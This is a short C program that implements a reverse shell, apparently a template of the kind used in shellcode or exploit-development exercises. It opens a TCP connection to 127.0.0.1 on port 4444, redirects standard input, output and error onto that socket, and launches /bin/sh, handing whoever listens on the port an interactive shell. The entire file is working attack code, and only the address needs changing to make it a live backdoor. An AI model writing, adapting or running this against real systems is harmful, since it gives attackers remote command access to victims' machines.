#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>

int main()
{
	// Create addr struct
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(4444);	// Port
	addr.sin_addr.s_addr = inet_addr("127.0.0.1");	// Connection IP

	// Create socket
	int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == -1) {
		perror("Socket creation failed.\n");
		exit(EXIT_FAILURE);
	}

	// Connect socket
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		perror("Socket connection failed.\n");
		close(sock);
		exit(EXIT_FAILURE);
	}

	// Duplicate stdin, stdout, stderr to socket
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	//Execute shell
	execve("/bin/sh", 0, 0);
}
